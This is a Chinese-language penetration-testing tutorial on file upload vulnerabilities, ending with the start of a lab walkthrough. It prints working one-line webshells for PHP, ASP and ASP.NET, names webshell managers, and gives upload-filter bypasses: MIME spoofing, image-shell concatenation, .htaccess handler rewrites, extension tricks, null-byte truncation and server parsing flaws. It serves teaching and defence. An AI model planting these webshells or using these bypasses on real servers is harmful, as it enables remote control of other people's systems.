# 文件上传漏洞

## WebShell简介

WebShell 简称网页后门, 是行在 Web 应用之上的远程控制程序. 

WebShell 其实就是一张网页, 由 PHP、JSP、ASP、ASP.NET 等这类 Web 应用程序语言开发, 但 WebShell 并不具备常见网页的功能, 例如登录、注册、信息展示等功能, 一般会具备文件管理、端口扫描、提权、获取系统信息等功能. 拥有较完整功能的 WebShell, 我们一般称为大马. 功能简易的 Webshell 称为小马. 除此之外还存在一句话木马、菜刀马、脱库马等名词, 是对于 WebShell 功能或者特性的简称。

### 一句话木马

#### php 一句话木马

```php
<?php @eval($_POST[x]); ?>
```

获取 POST 请求参数中 x 的值。例如 POST 请求中传递`x=phpinfo();` 那么`$_POST[x]`就等同于 `phpinfo();`

`eval()` 将字符串当作 PHP 代码执行。例如 `eval('phpinfo();'), 其中 `phpinfo();`会被当做PHP代码去执行。

`@` 是错误控制运算符，当放置在一个PHP表达式前时，该表达式产生的任何错误信息都被忽略掉。

#### ASP 一句话木马

```asp
<%eval request("x")%>
```

#### ASP.NET

```ASP
<%@ Page Language="Jscript"%><%eval(Request.Item["x"],"unsafe");%>
```

## WebShell管理工具

### 中国蚁剑

* [Github-加载器](https://github.com/AntSwordProject/AntSword-Loader)
* [Github-主程序](https://github.com/AntSwordProject/antSword)
* [官方文档](https://www.yuque.com/antswordproject/antsword)

中国蚁剑是一款开源的跨平台网站管理工具，也是一款WebShell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑的核心代码模板均改自中国菜刀。

### 冰蝎

[Github](https://github.com/rebeyond/Behinder)

### 哥斯拉

[Github](https://github.com/BeichenDream/Godzilla)

## 文件上传漏洞概述

大部分站点都具有文件上传功能, 如头像修改, 文章编辑, 附件上传等, 文件上传功能的作用是将本地文件上传至服务器上进行保存。

文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此
功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。

## 文件上传漏洞绕过

### 文件上传功能验证流程

* 客户端 JavaScript 验证 
* 服务端 MIME 类型验证(Content-Type)
* 服务端文件扩展名验证
  * 黑名单
  * 白名单
* 服务器文件内容验证
  * 文件头(文件幻数)
  * 文件加载检测

### 客户端 JavaScript 验证

```html
<script type="text/javascript">
  function checkUpload(fileobj) {
    var fileArr = fileobj.value.split('.'); //对文件名进行处理
    var ext = fileArr[fileArr.length - 1]; //得到文件扩展名
    if (ext != 'gif') {
      //验证扩展名
      alert('Only upload GIF images.');
      fileobj.value = ''; //清除数据
    }
  }
</script>
```

### 服务端 MIME 类型验证

MIME 类型是描述消息内容类型的因特网标准。

```php
//检测Content-type
if($_FILES['fupload']['type']!="image/gif")
{
  exit("Only upload GIF images.");
}
```

利用 Burpsuite 抓包，将报文中的Content-Type改成允许的类型即可绕过

* `Content-Type:image/gif`
* `Content-Type:image/jpg`
* `Content-Type:image/png`

### 服务器文件内容验证-文件头

图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。

常见文件幻数

* JPG: `FF D8 FF E0 00 10 4A 46 49 46`
* GIF: `47 49 46 38 39 61 (GlF89a)`
* PNG: `89 50 4E 47`

通过在 Burpsuite 抓包, 在文件内容前添加 `GIF89a` 字段可以绕过, 在图片文件结尾追加 webshell 字段也可以实现绕过. 

```cmd
copy /b logo.jpg + shell.php shell.jpg
```

### 服务端文件扩展名验证-黑名单

```php
//检测后缀名
$black_ext = explode("|", "asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini"); //转化为数组
if(in_array($file_ext,$black_ext))
{
  exit("Only upload GIF images.");
}
```

#### 后缀名大小写绕过

服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，在 Windows 操作系统中大小写不敏感，所以 .pHp 仍会被当成 PHP 文件解析. 

#### 重写绕过

服务端将黑名单的后缀名替换为空，但仅进行一次。上传.phphpp后缀，替换php一 次为空，则后缀为.php。

#### 特殊可解析后缀绕过

黑名单规则不严谨，在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。如 `phplphp2|php3|php4|php5|php6|php7|pht|phtm|phtml` 等, 基于 debian 和 ubuntu 的 apt-get 安装 apache，默认对于文件的解析规则如下:

![](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/apt_install_apache.png)

#### .htaccess 绕过

在 Apache 里，这个文件作为一个配置文件，用来控制所在目录的访问权限以及解析设置。通过设置可以将该目录下的所有文件作为php文件来解析, `.htaccess`可以写入Apache配置信息，改变当前目录以及子目录的 Apache 配置。

此方法绕过需要配置上允许`.htaccess生效` 

* Apache开启 rewrite 模块
* Apache配置文件为 `AllowOverride All`（默认为None）

以下配置可以让 shell.jpg 作为 php 脚本解析
```conf
<FilesMatch ".jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
```conf
AddType application/x-httpd-php .gif
```

#### 操作系统特性绕过(windows)

利用 window 对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除。

| 上传文件名 | 服务器文件名 | 说明 |
| --- | --- | --- |
| file.php[空格] | file.php |  |
| file.php[.] | file.php | 任意数量.均可 |
| file.php[%80-%99] | file.php | BurpSuite抓包，在文件名结尾输%80，<br>CTRL+SHIFT+U进行URL-DECODE，<br>或者增加一个空格，再在在HEX视图为把20修改为80 |
| file.php::$DATA | file.php | 文件内容不变 |
| file.php::$DATA...... | file.php | 文件内容不变 |

#### 服务端文件扩展名验证-黑名单绕过

**%00截断** php < 5.3.34 可用

%00 是 chr(0)，它不是空格，是NULL，空字符。

当程序在输出含有 chr(0) 变量时，chr(0) 后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。

在文件上传中，利用 %00 截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最
后文件保存在本地时，%00 会截断文件名，只保存 %00 之前的内容。

### 中间件文件解析漏洞

#### Apache 解析漏洞

Apache 解析文件规则时从右到左. 例如 shell.php.gix.ccc, apache 会先识别 ccc, ccc 不被识别, 则识别 gix, 以此类推, 最后会被识别为 php 执行.

https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html

#### IIS6.0 解析漏洞

**目录解析**

目录名为 `.asp`、`.asa`、`.cer`，则目录下的所有文件都会被作为ASP解析。

`url/test.asp/shelljpg` 会被当作asp脚本运行。

**文件解析**

文件名中分号后不被解析，例如`.asp;`、`.asa;`、`.cer;`。

`url/test.asp;shell.jpg` 会被当作asp脚本运行。

**文件类型解析**

`.asa`，`.cer`，`.cdx` 都会被作为 asp 文件执行。
`url/shell.asa` 会被作为asp文件执行。

#### Nginx 解析漏洞

PHP+Nginx 默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。

利用条件

* 以 FastCGl 运行
* `cgi.fix_pathinfo = 1` (全版本PHP默认为开启)

满足以上条件时, 访问 url/shell.jpg/shellphp 时，shell.jpg 会被当作 php 去执行。

#### Nginx 文件名逻辑漏洞（CVE-2013-4547）

**影响版本**: Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

**利用过程**:

1. 上传一个 `shell.jpg ` 文件，注意最后为空格
2. 访问 `url/shell.jpg[0x20][0x00].php` （两个中括号中的数字是用Burp在Hex界面中更改)

## 文件上传漏洞防御

* 服务端文件扩展名使用白名单检测+文件名重命名
* 对文件内容进行检测
* 对中间件做安全的配置

## 文件上传漏洞练习

### Pass-01

![image-20210916140133931](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916140133931.png)

经过测试发现文件上传限制为客户端限制, 可以本地删除对 checkFile 函数的调用实现绕过

![image-20210916140023241](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916140023241.png)

将文件后缀改为 jpg 上传, 通过 Burpsuite 抓包修改文件名也可以实现绕过

![image-20210916141131397](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/file_upload/image-20210916141131397.png)



